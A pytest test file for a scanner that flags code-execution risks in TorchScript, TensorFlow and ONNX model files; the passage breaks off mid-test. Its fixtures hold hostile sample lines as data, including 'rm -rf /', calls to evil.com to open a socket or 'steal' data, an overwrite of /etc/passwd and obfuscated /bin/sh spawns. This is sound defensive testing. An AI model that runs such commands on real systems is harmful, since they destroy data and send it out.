"""Tests for JIT/Script code execution detection."""

import ast
from pathlib import Path
from typing import Any

import pytest

from modelaudit.detectors import jit_script as jit_script_module
from modelaudit.detectors.jit_script import JITScriptDetector, detect_jit_script_risks


class TestJITScriptDetector:
    """Test the JITScriptDetector class."""

    def test_detect_dangerous_torch_ops(self):
        """Test detection of dangerous TorchScript operations."""
        detector = JITScriptDetector()

        # Create fake TorchScript data with dangerous operations
        data = b"""
        TorchScript-1.0
        def forward(self, x):
            torch.ops.aten.system("rm -rf /")
            torch.ops.aten.exec("malicious code")
            return x
        """

        findings = detector.scan_torchscript(data, "test_model.pt")
        assert len(findings) >= 2
        assert any("torch.ops.aten.system" in getattr(f, "pattern", getattr(f, "operation", "")) for f in findings)
        assert any("torch.ops.aten.exec" in getattr(f, "pattern", getattr(f, "operation", "")) for f in findings)
        assert all(
            getattr(f, "severity", getattr(f, "severity", "")) == "CRITICAL"
            for f in findings
            if hasattr(f, "pattern") or hasattr(f, "operation")
        )

    def test_detect_torch_jit_compilation(self):
        """Test detection of TorchScript JIT compilation."""
        detector = JITScriptDetector({"strict_mode": True})

        # Create data with JIT markers
        data = b"""
        torch.jit.script
        @torch.jit.compile
        def model_func():
            pass
        """

        findings = detector.scan_torchscript(data, "jit_model.pt")
        assert any(f.type == "jit_usage" for f in findings)

    def test_detect_embedded_pickle_in_torch(self):
        """Test detection of embedded pickle in TorchScript."""
        detector = JITScriptDetector()

        # Simulate TorchScript with pickle opcodes
        data = b"TorchScript\x00GLOBAL torch.nn Module\x00"

        findings = detector.scan_torchscript(data)
        assert any(f.type == "embedded_pickle" for f in findings)
        assert any("pickle" in f.message.lower() for f in findings)

    def test_detect_dangerous_tf_ops(self):
        """Test detection of dangerous TensorFlow operations."""
        detector = JITScriptDetector()

        # Create fake TensorFlow SavedModel data
        data = b"""
        saved_model.pb
        tf.py_func(lambda x: exec('malicious'), [input])
        tf.numpy_function(dangerous_func, [x], tf.float32)
        """

        findings = detector.scan_tensorflow(data, "model.pb")
        assert len(findings) >= 2
        assert any(f.operation is not None and "tf.py_func" in f.operation for f in findings)
        assert any(f.operation is not None and "tf.numpy_function" in f.operation for f in findings)

    def test_detect_keras_lambda_layers(self):
        """Test detection of Keras Lambda layers."""
        detector = JITScriptDetector()

        # Create data with Keras Lambda layer
        data = b"""
        tensorflow.keras.layers.Lambda
        lambda x: eval(x)
        """

        findings = detector.scan_tensorflow(data)
        assert any(f.type == "lambda_layer" for f in findings)
        assert any("Lambda" in f.message for f in findings)

    def test_detect_onnx_custom_operators(self):
        """Test detection of ONNX custom operators."""
        detector = JITScriptDetector()

        # Create fake ONNX data with custom operators
        data = b"""
        ai.onnx.contrib.custom_op
        PythonOp: eval_code
        """

        findings = detector.scan_onnx(data, "model.onnx")
        assert any(f.type == "custom_operator" for f in findings)
        assert any(f.type == "python_operator" for f in findings)

    def test_detect_dangerous_imports_in_code(self):
        """Test detection of dangerous imports in embedded code."""
        detector = JITScriptDetector()

        # Create data with embedded Python code containing dangerous imports
        data = b"""
        def malicious_function():
            import os
            import subprocess
            os.system('evil command')
            subprocess.call(['rm', '-rf', '/'])
        """

        findings = detector._extract_and_check_python_code(data, "Test", "test.model")
        assert any("os" in getattr(f, "import_", "") for f in findings)
        assert any("subprocess" in getattr(f, "import_", "") for f in findings)
        assert any(f.severity == "CRITICAL" for f in findings)

    def test_known_dangerous_import_reuses_compiled_patterns(self, monkeypatch: pytest.MonkeyPatch) -> None:
        """Known import checks should not rebuild regex source at call time."""

        def fail_escape(_value: str) -> str:
            raise AssertionError("known import checks should reuse compiled patterns")

        monkeypatch.setattr(jit_script_module.re, "escape", fail_escape)

        assert JITScriptDetector._contains_dangerous_import("import os\n", "os") is True

    def test_scan_torchscript_checks_unmarked_python_blobs(self) -> None:
        """Raw Python payloads should be analyzed even without TorchScript markers."""
        detector = JITScriptDetector()
        data = b"""
        def payload():
            import os
            return os.system("echo pwned")
        """

        findings = detector.scan_torchscript(data, "opaque.bin")

        assert any(getattr(finding, "import_", "") == "os" for finding in findings)

    def test_detect_dangerous_builtins(self):
        """Test detection of dangerous builtins like eval, exec."""
        detector = JITScriptDetector()

        data = b"""
        def process_input(x):
            result = eval(x)
            exec(compile(x, 'string', 'exec'))
            return __import__('os').system(result)
        """

        findings = detector._extract_and_check_python_code(data, "Test", "test.model")
        assert any("eval" in getattr(f, "builtin", "") for f in findings)
        assert any("exec" in getattr(f, "builtin", "") for f in findings)
        assert any("__import__" in getattr(f, "builtin", "") for f in findings)

    def test_detect_code_execution_patterns(self):
        """Test detection of code execution patterns in binary data."""
        detector = JITScriptDetector()

        # Create data with various execution patterns
        data = b"""
        subprocess.run(['malicious', 'command'])
        os.system('rm -rf /')
        socket.create_connection(('evil.com', 1337))
        urllib.request.urlopen('http://evil.com/steal')
        open('/etc/passwd', 'w').write('hacked')
        """

        findings = detector._extract_and_check_python_code(data, "Test", "test.model")
        assert any("subprocess" in getattr(f, "pattern", "").lower() for f in findings)
        assert any("os command" in getattr(f, "pattern", "").lower() for f in findings)
        assert any("socket" in getattr(f, "pattern", "").lower() for f in findings)

    def test_auto_detect_model_type(self) -> None:
        """Test automatic model type detection."""
        detector = JITScriptDetector()

        # Test PyTorch detection
        pytorch_data = b"TorchScript model data"
        pytorch_findings = detector.scan_model(pytorch_data, "unknown")
        assert isinstance(pytorch_findings, list)

        # Test TensorFlow detection
        tf_data = b"saved_model.pb tensorflow data"
        tf_findings = detector.scan_model(tf_data, "unknown")
        assert isinstance(tf_findings, list)

        # Test ONNX detection
        onnx_data = b"ai.onnx model data"
        onnx_findings = detector.scan_model(onnx_data, "unknown")
        assert isinstance(onnx_findings, list)

    def test_scan_model_detects_unmarked_dangerous_python_source(self) -> None:
        detector = JITScriptDetector()
        data = b"""
        def payload():
            import os
            return eval("1 + 1") or os.system("id")
        """

        findings = detector.scan_model(data, "pytorch", "payload.bin")

        assert any(f.type == "dangerous_import" and f.import_ == "os" for f in findings)
        assert any(f.type == "dangerous_builtin" and f.builtin == "eval" for f in findings)

    def test_scan_model_ignores_unmarked_benign_python_source(self) -> None:
        detector = JITScriptDetector()
        data = b"""
        def normalize(values):
            total = sum(values)
            return [value / total for value in values]
        """

        findings = detector.scan_model(data, "pytorch", "payload.bin")

        assert findings == []

    def test_scan_model_ignores_non_source_dangerous_text(self) -> None:
        detector = JITScriptDetector()

        findings = detector.scan_model(b"metadata says eval( is unsupported", "pytorch", "payload.bin")

        assert findings == []

    def test_scan_model_detects_unmarked_module_scope_python_source(self) -> None:
        detector = JITScriptDetector()
        findings = detector.scan_model(b"import os\nos.system('id')\n", "pytorch", "payload.bin")

        assert any(f.type == "dangerous_import" and f.import_ == "os" for f in findings)

    def test_scan_model_detects_late_unmarked_module_scope_python_source(self) -> None:
        detector = JITScriptDetector()
        data = b"# pad\n" * 200000 + b"import os\nos.system('id')\n"

        findings = detector.scan_model(data, "pytorch", "payload.bin")

        assert any(f.type == "dangerous_import" and f.import_ == "os" for f in findings)

    def test_scan_model_detects_unmarked_from_import_source(self) -> None:
        detector = JITScriptDetector()

        findings = detector.scan_model(b"from os import system as run\nrun('id')\n", "pytorch", "payload.bin")

        assert any(f.type == "dangerous_import" and f.import_ == "os" for f in findings)

    @pytest.mark.parametrize(
        "source",
        [
            b"def payload():\n    return os.posix_spawn('/bin/sh', ['sh'], {})\n",
            b"def payload():\n    return os.posix_spawnp('sh', ['sh'], {})\n",
            b"def payload():\n    return os.startfile('payload.exe')\n",
            b"def payload():\n    return getattr(os, 'posix_' + 'spawn')('/bin/sh', ['sh'], {})\n",
            b"def payload():\n    os.posix_spawn = len\n    return os.posix_spawn([])\n",
            b"def payload(data):\n    os.posix_spawn = pickle.loads\n    return os.posix_spawn(data)\n",
        ],
    )
    def test_scan_model_detects_os_process_launch_source_conservatively(self, source: bytes) -> None:
        detector = JITScriptDetector()

        findings = detector.scan_model(source, "pytorch", "payload.bin")

        assert any(
            f.type == "code_execution_pattern" and f.pattern == "OS command execution detected" for f in findings
        )

    def test_scan_model_ignores_string_literal_os_process_launch(self) -> None:
        detector = JITScriptDetector()
        source = b"def payload():\n    return \"os.posix_spawn('/bin/sh', ['sh'], {})\"\n"

        findings = detector.scan_model(source, "pytorch", "payload.bin")

        assert findings == []

    def test_scan_model_ignores_binary_framed_string_literal_os_process_launch(self) -> None:
        detector = JITScriptDetector()
        source = b"\x00\xffdef payload():\n    return \"os.posix_spawn('/bin/sh', ['sh'], {})\"\n}"

        findings = detector.scan_model(source, "pytorch", "payload.bin")

        assert not any(
            f.type == "code_execution_pattern" and f.pattern == "OS command execution detected" for f in findings
        )

    def test_scan_model_ignores_string_literal_os_process_launch_with_unrelated_risk(self) -> None:
        detector = JITScriptDetector()
        source = (
            b"import pickle\n\n"
            b"def payload(data):\n"
            b"    pickle.loads(data)\n"
            b"    return \"os.posix_spawn('/bin/sh', ['sh'], {})\"\n"
        )

        findings = detector.scan_model(source, "pytorch", "payload.bin")

        assert not any(
            f.type == "code_execution_pattern" and f.pattern == "OS command execution detected" for f in findings
        )

    @pytest.mark.parametrize(
        "source",
        [
            (
                b"import os\n"
                b"import subprocess\n\n"
                b"def payload(args):\n"
                b"    marker = os.posix_spawn\n"
                b"    return subprocess.list2cmdline(args)\n"
            ),
            (
                b"import os\n"
                b"import subprocess\n\n"
                b"def payload():\n"
                b"    marker = os.posix_spawn\n"
                b"    return subprocess.run(['echo', 'ok'], check=False)\n"
            ),
        ],
    )
    def test_scan_model_ignores_uninvoked_os_process_reference_with_unrelated_risk(self, source: bytes) -> None:
        detector = JITScriptDetector()

        findings = detector.scan_model(source, "pytorch", "payload.bin")

        assert not any(
            f.type == "code_execution_pattern" and f.pattern == "OS command execution detected" for f in findings
        )

    def test_scan_model_detects_embedded_snippet_alias_aware_os_process_launch(self) -> None:
        detector = JITScriptDetector()
        source = (
            b"\x00\xffdef payload():\n"
            b"    import os\n"
            b"    return getattr(os, 'posix_' + 'spawn')('/bin/sh', ['sh'], {})\n"
            b"}"
        )

        findings = detector.scan_model(source, "pytorch", "payload.bin")

        assert any(
            f.type == "code_execution_pattern" and f.pattern == "OS command execution detected" for f in findings
        )

    def test_scan_model_detects_embedded_snippet_alias_aware_os_process_launch_before_binary_tail(self) -> None:
        detector = JITScriptDetector()
        source = (
            b"\x00\xffdef payload():\n"
            b"    import os\n"
            b"    return getattr(os, 'posix_' + 'spawn')('/bin/sh', ['sh'], dict())\n"
            b"\x00\xffMODEL-FRAMING"
        )

        findings = detector.scan_model(source, "pytorch", "payload.bin")

        assert any(
            f.type == "code_execution_pattern" and f.pattern == "OS command execution detected" for f in findings
        )

    def test_scan_model_detects_framed_module_import_alias_aware_os_process_launch(self) -> None:
        detector = JITScriptDetector()
        source = (
            b"\x00\xffimport os\ndef payload():\n    return getattr(os, 'posix_' + 'spawn')('/bin/sh', ['sh'], {})\n}"
        )

        findings = detector.scan_model(source, "pytorch", "payload.bin")

        assert any(
            f.type == "code_execution_pattern" and f.pattern == "OS command execution detected" for f in findings
        )

    def test_scan_model_allows_framed_benign_dict_literal_os_accessor(self) -> None:
        detector = JITScriptDetector()
        source = b"\x00\xffdef payload():\n    import os\n    return {'cwd': getattr(os, 'getcwd')()}\n}"

        findings = detector.scan_model(source, "pytorch", "payload.bin")

        assert not any(
            f.type == "code_execution_pattern" and f.pattern == "OS command execution detected" for f in findings
        )

    @pytest.mark.parametrize(
        "source",
        [
            b"async def payload():\n    return await asyncio.create_subprocess_shell('id')\n",
            b"async def payload():\n    return await asyncio.subprocess.create_subprocess_exec('id')\n",
            (
                b"from asyncio import create_subprocess_exec as launch\n"
                b"async def payload():\n    return await launch('id')\n"
            ),
            (
                b"async def payload():\n"
                b"    asyncio.create_subprocess_shell = len\n"
                b"    return asyncio.create_subprocess_shell([])\n"
            ),
            (
                b"async def payload(data):\n"
                b"    asyncio.create_subprocess_exec = pickle.loads\n"
                b"    return asyncio.create_subprocess_exec(data)\n"
            ),
        ],
    )
    def test_scan_model_detects_asyncio_subprocess_launch_source_conservatively(self, source: bytes) -> None:
        detector = JITScriptDetector()

        findings = detector.scan_model(source, "pytorch", "payload.bin")

        assert any(
            f.type == "code_execution_pattern" and f.pattern == "Subprocess execution detected" for f in findings
        )

    def test_scan_model_ignores_string_literal_asyncio_subprocess_launch_with_unrelated_risk(self) -> None:
        detector = JITScriptDetector()
        source = (
            b"import pickle\n\n"
            b"def payload(data):\n"
            b"    pickle.loads(data)\n"
            b"    return \"asyncio.create_subprocess_shell('id')\"\n"
        )

        findings = detector.scan_model(source, "pytorch", "payload.bin")

        assert not any(
            f.type == "code_execution_pattern" and f.pattern == "Subprocess execution detected" for f in findings
        )

    def test_scan_model_ignores_binary_framed_string_literal_asyncio_subprocess_launch(self) -> None:
        detector = JITScriptDetector()
        source = b"\x00\xffdef payload():\n    return \"asyncio.create_subprocess_shell('id')\"\n\x00\xffMODEL-FRAMING"

        findings = detector.scan_model(source, "pytorch", "payload.bin")

        assert not any(
            f.type == "code_execution_pattern" and f.pattern == "Subprocess execution detected" for f in findings
        )

    def test_scan_model_ignores_lossy_decoded_string_literal_asyncio_subprocess_launch(self) -> None:
        detector = JITScriptDetector()
        source = (
            b"\x00\xffdef payload():\n"
            b"    # ignored invalid bytes: "
            + (b"\xff" * 64)
            + b"\n    return \"asyncio.create_subprocess_shell('id')\"\n\x00\xffMODEL-FRAMING"
        )

        findings = detector.scan_model(source, "pytorch", "payload.bin")

        assert not any(
            f.type == "code_execution_pattern" and f.pattern == "Subprocess execution detected" for f in findings
        )

    def test_parse_embedded_python_snippet_caps_trim_attempts(self, monkeypatch: pytest.MonkeyPatch) -> None:
        parse_calls = 0

        def fail_parse(_source: str) -> ast.AST:
            nonlocal parse_calls
            parse_calls += 1
            raise SyntaxError("bad syntax", ("<embedded>", 1, 1, "bad"))

        monkeypatch.setattr(jit_script_module.ast, "parse", fail_parse)

        tree = jit_script_module._parse_embedded_python_snippet(
            "def payload():\n" + "\n".join("bad" for _ in range(1000))
        )

        assert tree is None
        assert parse_calls <= jit_script_module._MAX_SNIPPET_PARSE_TRIM_ATTEMPTS + 2

    def test_scan_model_detects_binary_framed_long_tail_alias_aware_asyncio_subprocess_launch(self) -> None:
        detector = JITScriptDetector()
        tail = b"\n".join(b"tail" for _ in range(jit_script_module._MAX_SNIPPET_PARSE_TRIM_ATTEMPTS + 20))
        source = (
            b"\x00\xffdef payload():\n"
            b"    from asyncio import create_subprocess_shell as launch\n"
            b"    return launch('id')\n"
            b"\x00" + tail
        )

        findings = detector.scan_model(source, "pytorch", "payload.bin")

        assert any(
            f.type == "code_execution_pattern" and f.pattern == "Subprocess execution detected" for f in findings
        )

    def test_scan_model_detects_binary_framed_long_tail_alias_aware_os_process_launch(self) -> None:
        detector = JITScriptDetector()
        tail = b"\n".join(b"tail" for _ in range(jit_script_module._MAX_SNIPPET_PARSE_TRIM_ATTEMPTS + 20))
        source = b"\x00\xffdef payload():\n    import os as o\n    return getattr(o, 'system')('id')\n\x00" + tail

        findings = detector.scan_model(source, "pytorch", "payload.bin")

        assert any(
            f.type == "code_execution_pattern" and f.pattern == "OS command execution detected" for f in findings
        )

    def test_scan_model_preserves_raw_asyncio_match_in_unparsed_snippet_after_benign_parse(self) -> None:
        detector = JITScriptDetector()
        source = (
            b"def benign():\n"
            b"    return \"asyncio.create_subprocess_shell('id')\"\n"
            b"}\n"
            b"def payload():\n"
            b"if True print('broken')\n"
            b"asyncio.create_subprocess_shell('id')\n"
        )

        findings = detector.scan_model(source, "pytorch", "payload.bin")

        assert any(
            f.type == "code_execution_pattern" and f.pattern == "Subprocess execution detected" for f in findings
        )

    def test_scan_model_detects_embedded_snippet_alias_aware_asyncio_subprocess_launch(self) -> None:
        detector = JITScriptDetector()
        source = (
            b"\x00\xffdef payload():\n"
            b"    from asyncio import create_subprocess_shell as launch\n"
            b"    return launch('id')\n"
            b"}"
        )

        findings = detector.scan_model(source, "pytorch", "payload.bin")

        assert any(
            f.type == "code_execution_pattern" and f.pattern == "Subprocess execution detected" for f in findings
        )

    @pytest.mark.parametrize(
        "source",
        [
            b"def payload():\n    return runpy._run_module_as_main('payload')\n",
            b"def payload():\n    return runpy.run_module('payload')\n",
            b"def payload():\n    from runpy import run_path as run\n    return run('payload.py')\n",
        ],
    )
    def test_scan_model_detects_unmarked_runpy_execution(self, source: bytes) -> None:
        detector = JITScriptDetector()

        findings = detector.scan_model(source, "pytorch", "payload.bin")

        assert any(
            f.type == "code_execution_pattern" and f.pattern == "Dynamic module execution detected" for f in findings
        )

    def test_scan_model_ignores_certain_replaced_runpy_execution(self) -> None:
        detector = JITScriptDetector()
        source = b"def payload():\n    runpy.run_path = len\n    return runpy.run_path([])\n"

        findings = detector.scan_model(source, "pytorch", "payload.bin")

        assert findings == []

    def test_scan_model_ignores_runpy_member_after_module_alias_rebind(self) -> None:
        detector = JITScriptDetector()
        source = (
            b"class Safe:\n"
            b"    run_path = len\n"
            b"def payload():\n"
            b"    import runpy as rp\n"
            b"    rp = Safe()\n"
            b"    return rp.run_path([])\n"
        )

        findings = detector.scan_model(source, "pytorch", "payload.bin")

        assert not any(
            f.type == "code_execution_pattern" and f.pattern == "Dynamic module execution detected" for f in findings
        )

    def test_scan_model_preserves_possible_runpy_execution_after_conditional_replacement(self) -> None:
        detector = JITScriptDetector()
        source = (
            b"def payload():\n    if replace:\n        runpy.run_path = len\n    return runpy.run_path('payload.py')\n"
        )

        findings = detector.scan_model(source, "pytorch", "payload.bin")

        assert any(
            f.type == "code_execution_pattern" and f.pattern == "Dynamic module execution detected" for f in findings
        )

    def test_scan_model_detects_binary_prefixed_aliased_runpy_execution(self) -> None:
        detector = JITScriptDetector()
        source = b"\x00\xffdef payload():\n    from runpy import run_path as run\n    return run('payload.py')\n"

        findings = detector.scan_model(source, "pytorch", "payload.bin")

        assert any(
            f.type == "code_execution_pattern" and f.pattern == "Dynamic module execution detected" for f in findings
        )

    def test_scan_model_detects_binary_framed_top_level_runpy_execution(self) -> None:
        detector = JITScriptDetector()
        source = b"\x00\xfffrom runpy import run_path as run\nrun('payload.py')\n\x00MODEL-FRAMING"

        findings = detector.scan_model(source, "pytorch", "payload.bin")

        assert any(
            f.type == "code_execution_pattern" and f.pattern == "Dynamic module execution detected" for f in findings
        )

    def test_scan_model_detects_tail_window_runpy_execution(self) -> None:
        detector = JITScriptDetector()
        source = (
            b"\x00" * (jit_script_module._EMBEDDED_PYTHON_SCAN_WINDOW_BYTES + 16)
            + b"\x00\xfffrom runpy import run_path as run\nrun('payload.py')\n\x00MODEL-FRAMING"
        )

        findings = detector.scan_model(source, "pytorch", "payload.bin")

        assert any(
            f.type == "code_execution_pattern" and f.pattern == "Dynamic module execution detected" for f in findings
        )

    def test_scan_model_detects_late_priority_runpy_snippet_after_harmless_imports(self) -> None:
        detector = JITScriptDetector()
        leading_imports = b"".join(f"import harmless_{index}\n\x00".encode() for index in range(12))
        source = b"\x00\xff" + leading_imports + b"from runpy import run_path as run\nrun('payload.py')\n"

        findings = detector.scan_model(source, "pytorch", "payload.bin")

        assert any(
            f.type == "code_execution_pattern" and f.pattern == "Dynamic module execution detected" for f in findings
        )

    def test_scan_model_detects_late_priority_runpy_import_list_alias(self) -> None:
        detector = JITScriptDetector()
        leading_imports = b"".join(f"import harmless_{index}\n\x00".encode() for index in range(12))
        source = b"\x00\xff" + leading_imports + b"import harmless as h, runpy as rp\nrp.run_path('payload.py')\n"

        findings = detector.scan_model(source, "pytorch", "payload.bin")

        assert any(
            f.type == "code_execution_pattern" and f.pattern == "Dynamic module execution detected" for f in findings
        )

    def test_scan_model_detects_late_priority_runpy_continued_import_list_alias(self) -> None:
        detector = JITScriptDetector()
        leading_imports = b"".join(f"import harmless_{index}\n\x00".encode() for index in range(12))
        source = (
            b"\x00\xff" + leading_imports + b"import harmless as h, \\\n    runpy as rp\nrp.run_path('payload.py')\n"
        )

        findings = detector.scan_model(source, "pytorch", "payload.bin")

        assert any(
            f.type == "code_execution_pattern" and f.pattern == "Dynamic module execution detected" for f in findings
        )

    @pytest.mark.parametrize(
        "continued_import",
        [
            b"from runpy\\\n import run_path as run\n",
            b"from runpy \\\n import run_path as run\n",
            b"from runpy\\\r\n import run_path as run\r\n",
            b"from runpy \\\r\n import run_path as run\r\n",
        ],
    )
    def test_scan_model_detects_late_priority_runpy_continued_from_import(self, continued_import: bytes) -> None:
        detector = JITScriptDetector()
        leading_imports = b"".join(f"import harmless_{index}\n\x00".encode() for index in range(12))
        source = b"\x00\xff" + leading_imports + continued_import + b"run('payload.py')\n"

        findings = detector.scan_model(source, "pytorch", "payload.bin")

        assert any(
            f.type == "code_execution_pattern" and f.pattern == "Dynamic module execution detected" for f in findings
        )

    def test_scan_model_detects_late_priority_runpy_import_after_large_function_preamble(self) -> None:
        detector = JITScriptDetector()
        leading_blocks = b"".join(
            f"def benign_{index}():\n    return {index}\n}}\x00".encode()
            for index in range(jit_script_module._MAX_DEFAULT_EMBEDDED_PYTHON_SNIPPETS + 2)
        )
        padding = b"    # pad\n" * 600
        source = (
            b"\x00\xff"
            + leading_blocks
            + b"def payload():\n"
            + padding
            + b"    import runpy as rp\n"
            + b"    return rp.run_path('payload.py')\n"
        )

        findings = detector.scan_model(source, "pytorch", "payload.bin")

        assert any(
            f.type == "code_execution_pattern" and f.pattern == "Dynamic module execution detected" for f in findings
        )

    def test_scan_model_reports_tail_runpy_after_prefix_overwrite_across_gap(self) -> None:
        detector = JITScriptDetector()
        filler_line = b"# filler\n"
        filler = filler_line * (2 * jit_script_module._EMBEDDED_PYTHON_SCAN_WINDOW_BYTES // len(filler_line) + 1)
        source = (
            b"\x00\xffimport runpy\n"
            b"runpy.run_path = len\n" + filler + b"def payload():\n    return runpy.run_path([])\n"
        )

        findings = detector.scan_model(source, "pytorch", "payload.bin")

        assert any(
            f.type == "code_execution_pattern" and f.pattern == "Dynamic module execution detected" for f in findings
        )

    def test_scan_model_reports_tail_runpy_when_omitted_middle_may_restore_overwrite(self) -> None:
        detector = JITScriptDetector()
        filler_line = b"# filler\n"
        filler = filler_line * (jit_script_module._EMBEDDED_PYTHON_SCAN_WINDOW_BYTES // len(filler_line) + 1)
        source = (
            b"\x00\xffimport runpy\n"
            b"runpy.run_path = len\n"
            + filler
            + b"runpy.__dict__['run_path'] = runpy.run_module\n"
            + filler
            + b"def payload():\n    return runpy.run_path('payload.py')\n"
        )

        findings = detector.scan_model(source, "pytorch", "payload.bin")

        assert any(
            f.type == "code_execution_pattern" and f.pattern == "Dynamic module execution detected" for f in findings
        )

    def test_scan_model_reports_tail_runpy_when_safe_middle_state_is_omitted(self) -> None:
        detector = JITScriptDetector()
        filler_line = b"# filler\n"
        filler = filler_line * (jit_script_module._EMBEDDED_PYTHON_SCAN_WINDOW_BYTES // len(filler_line) + 1)
        source = (
            b"\x00\xffimport runpy\n"
            + filler
            + b"runpy.run_path = len\n"
            + filler
            + b"def payload():\n    return runpy.run_path([])\n"
        )

        findings = detector.scan_model(source, "pytorch", "payload.bin")

        assert any(
            f.type == "code_execution_pattern" and f.pattern == "Dynamic module execution detected" for f in findings
        )

    def test_scan_model_detects_tail_runpy_alias_from_framed_prefix_import_context(self) -> None:
        detector = JITScriptDetector()
        filler_line = b"# filler\n"
        filler = filler_line * (2 * jit_script_module._EMBEDDED_PYTHON_SCAN_WINDOW_BYTES // len(filler_line) + 1)
        source = b"\x00\xffimport runpy as rp\n" + filler + b"def payload():\n    return rp.run_path('payload.py')\n"

        findings = detector.scan_model(source, "pytorch", "payload.bin")

        assert any(
            f.type == "code_execution_pattern" and f.pattern == "Dynamic module execution detected" for f in findings
        )

    def test_scan_model_detects_tail_alias_call_with_comment_parenthesis_in_prefix_import(self) -> None:
        detector = JITScriptDetector()
        filler_line = b"# filler\n"
        filler = filler_line * (2 * jit_script_module._EMBEDDED_PYTHON_SCAN_WINDOW_BYTES // len(filler_line) + 1)
        source = (
            b"\x00\xffimport runpy as rp  # (\n" + filler + b"def payload():\n    return rp.run_path('payload.py')\n"
        )

        findings = detector.scan_model(source, "pytorch", "payload.bin")

        assert any(
            f.type == "code_execution_pattern" and f.pattern == "Dynamic module execution detected" for f in findings
        )

    def test_scan_model_detects_tail_alias_call_with_string_parenthesis_in_prefix_import(self) -> None:
        detector = JITScriptDetector()
        filler_line = b"# filler\n"
        filler = filler_line * (2 * jit_script_module._EMBEDDED_PYTHON_SCAN_WINDOW_BYTES // len(filler_line) + 1)
        source = (
            b'\x00\xffimport runpy as rp; marker = "("\n'
            + filler
            + b"def payload():\n    return rp.run_path('payload.py')\n"
        )

        findings = detector.scan_model(source, "pytorch", "payload.bin")

        assert any(
            f.type == "code_execution_pattern" and f.pattern == "Dynamic module execution detected" for f in findings
        )

    def test_scan_model_detects_deep_priority_import_in_function_context(self) -> None:
        detector = JITScriptDetector()
        leading_blocks = b"".join(
            f"def benign_{index}():\n    return {index}\n}}\x00".encode()
            for index in range(jit_script_module._MAX_DEFAULT_EMBEDDED_PYTHON_SNIPPETS + 2)
        )
        padding_line = b"    # pad\n"
        padding = padding_line * (
            jit_script_module._MAX_PRIORITY_EMBEDDED_PYTHON_SNIPPET_BYTES // len(padding_line) + 8
        )
        source = (
            b"\x00\xff"
            + leading_blocks
            + b"def payload():\n"
            + padding
            + b"    import runpy as rp\n"
            + b"    return rp.run_path('payload.py')\n"
        )

        findings = detector.scan_model(source, "pytorch", "payload.bin")

        assert any(
            f.type == "code_execution_pattern" and f.pattern == "Dynamic module execution detected" for f in findings
        )

    def test_scan_model_detects_late_priority_alias_call_after_import_window(self) -> None:
        detector = JITScriptDetector()
        leading_blocks = b"".join(
            f"def benign_{index}():\n    return {index}\n}}\x00".encode()
            for index in range(jit_script_module._MAX_DEFAULT_EMBEDDED_PYTHON_SNIPPETS + 2)
        )
        padding_line = b"# pad\n"
        padding = padding_line * (
            jit_script_module._MAX_PRIORITY_EMBEDDED_PYTHON_SNIPPET_BYTES // len(padding_line) + 8
        )
        source = b"\x00\xff" + leading_blocks + b"import runpy as rp\n" + padding + b"rp.run_path('payload.py')\n"

        findings = detector.scan_model(source, "pytorch", "payload.bin")

        assert any(
            f.type == "code_execution_pattern" and f.pattern == "Dynamic module execution detected" for f in findings
        )

    def test_scan_model_does_not_report_safe_late_priority_overwrite_from_compact_span(self) -> None:
        detector = JITScriptDetector()
        leading_blocks = b"".join(
            f"def benign_{index}():\n    return {index}\n}}\x00".encode()
            for index in range(jit_script_module._MAX_DEFAULT_EMBEDDED_PYTHON_SNIPPETS + 2)
        )
        padding_line = b"    # pad\n"
        padding = padding_line * (
            jit_script_module._MAX_PRIORITY_EMBEDDED_PYTHON_SNIPPET_BYTES // len(padding_line) + 8
        )
        source = (
            b"\x00\xff"
            + leading_blocks
            + b"def payload():\n"
            + padding
            + b"    import runpy\n"
            + b"    runpy.run_path = len\n"
            + b"    return runpy.run_path([])\n"
        )

        findings = detector.scan_model(source, "pytorch", "payload.bin")

        assert not any(
            f.type == "code_execution_pattern" and f.pattern == "Dynamic module execution detected" for f in findings
        )

    def test_scan_model_ignores_late_priority_alias_use_inside_multiline_string(self) -> None:
        detector = JITScriptDetector()
        leading_blocks = b"".join(
            f"def benign_{index}():\n    return {index}\n}}\x00".encode()
            for index in range(jit_script_module._MAX_DEFAULT_EMBEDDED_PYTHON_SNIPPETS + 2)
        )
        padding_line = b"    # pad\n"
        padding = padding_line * (
            jit_script_module._MAX_PRIORITY_EMBEDDED_PYTHON_SNIPPET_BYTES // len(padding_line) + 8
        )
        source = (
            b"\x00\xff" + leading_blocks + b"def payload():\n"
            b"    import runpy as rp\n" + padding + b'    text = """\n'
            b"    rp.run_path('payload.py')\n"
            b'    """\n'
            b"    return 1\n"
        )

        findings = detector.scan_model(source, "pytorch", "payload.bin")

        assert not any(
            f.type == "code_execution_pattern" and f.pattern == "Dynamic module execution detected" for f in findings
        )

    def test_scan_model_detects_late_rebound_alias_call_after_priority_window(self) -> None:
        detector = JITScriptDetector()
        leading_blocks = b"".join(
            f"def benign_{index}():\n    return {index}\n}}\x00".encode()
            for index in range(jit_script_module._MAX_DEFAULT_EMBEDDED_PYTHON_SNIPPETS + 2)
        )
        padding_line = b"# pad\n"
        padding = padding_line * (
            jit_script_module._MAX_PRIORITY_EMBEDDED_PYTHON_SNIPPET_BYTES // len(padding_line) + 8
        )
        source = (
            b"\x00\xff" + leading_blocks + b"import runpy as rp\n" + padding + b"rp.run_path = runpy.run_module\n"
            b"rp.run_path('payload')\n"
        )

        findings = detector.scan_model(source, "pytorch", "payload.bin")

        assert any(
            f.type == "code_execution_pattern" and f.pattern == "Dynamic module execution detected" for f in findings
        )

    def test_scan_model_preserves_raw_runpy_call_between_compact_priority_segments(self) -> None:
        detector = JITScriptDetector()
        leading_blocks = b"".join(
            f"def benign_{index}():\n    return {index}\n}}\x00".encode()
            for index in range(jit_script_module._MAX_DEFAULT_EMBEDDED_PYTHON_SNIPPETS + 2)
        )
        padding_before = b"# before\n" * (
            jit_script_module._MAX_PRIORITY_EMBEDDED_PYTHON_SNIPPET_BYTES // len(b"# before\n") + 8
        )
        padding_after = b"# after\n" * (
            jit_script_module._MAX_PRIORITY_EMBEDDED_PYTHON_SNIPPET_BYTES // len(b"# after\n") + 8
        )
        source = (
            b"\x00\xff"
            + leading_blocks
            + b"import os\n"
            + padding_before
            + b"runpy.run_path('payload.py')\n"
            + padding_after
        )

        findings = detector.scan_model(source, "pytorch", "payload.bin")

        assert any(
            f.type == "code_execution_pattern" and f.pattern == "Dynamic module execution detected" for f in findings
        )

    def test_scan_model_detects_late_alias_call_after_non_call_alias_use(self) -> None:
        detector = JITScriptDetector()
        leading_blocks = b"".join(
